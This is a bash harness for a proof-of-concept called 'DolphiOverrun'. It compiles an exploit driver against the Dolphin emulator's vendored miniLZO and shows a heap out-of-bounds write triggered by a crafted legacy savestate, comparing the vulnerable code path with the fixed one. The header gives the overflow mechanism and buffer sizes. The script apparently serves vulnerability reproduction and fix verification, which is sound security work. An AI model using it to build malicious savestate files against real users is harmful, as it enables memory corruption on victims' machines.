#!/usr/bin/env bash
# DolphiOverrun — Dolphin emulator legacy-savestate LZO decompression
# heap out-of-bounds write (CWE-787).
#
# Builds the REAL miniLZO decompressor that dolphin-emu/dolphin vendors verbatim
# under Externals/LZO/ (copied byte-for-byte into vendor/) and drives it through
# a faithful reproduction of Source/Core/Core/State.cpp `GetVersionFromLZO()`
# (pre-fix f662e858~1) against a crafted malicious legacy .sav.
#
# Differential:
#   vulnerable : lzo1x_decompress (UNSAFE) writes 4096 bytes into a 64-byte
#                lzo_size-controlled buffer -> 4032 canary bytes clobbered; and
#                ReadBytes(out, cur_len) reads OUT_LEN+128 bytes into out[OUT_LEN]
#                -> 128 canary bytes clobbered.
#   fixed      : lzo1x_decompress_safe into a fixed IN_LEN buffer -> contained,
#                and cur_len > OUT_LEN is rejected before reading.
#
# exit 0 = overrun reproduced on the vulnerable path AND contained on the fixed
#          path (differential proof). Any other outcome -> non-zero.
set -u
cd "$(dirname "$0")"

ZIG="${ZIG:-/home/millie/tools/toolchain/zig-linux-x86_64-0.14.0/zig}"
if [ ! -x "$ZIG" ]; then
  ZIG="$(command -v zig || true)"
fi
if [ -z "$ZIG" ] || ! "$ZIG" version >/dev/null 2>&1; then
  echo "zig toolchain not found (set ZIG=/path/to/zig)"; exit 2
fi

WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

echo "=== build harness against the REAL Dolphin-vendored miniLZO ==="
timeout 180 "$ZIG" cc -O1 -Ivendor -o "$WORK/dolphi" exploit.c vendor/minilzo.c \
  || { echo "build failed"; exit 2; }

echo
echo "=== run differential (vulnerable GetVersionFromLZO vs fixed) ==="
OUT="$("$WORK/dolphi" 2>&1)"
RC=$?
echo "$OUT"

if [ "$RC" -eq 0 ] && echo "$OUT" | grep -q "DOLPHIOVERRUN-OK"; then
  echo
  echo "DOLPHIOVERRUN-OK: vulnerable path overruns the heap (CWE-787 OOB write), fixed path contains it."
  exit 0
else
  echo "DOLPHIOVERRUN-FAIL: unexpected exit code or missing marker (rc=$RC)"
  exit 1
fi
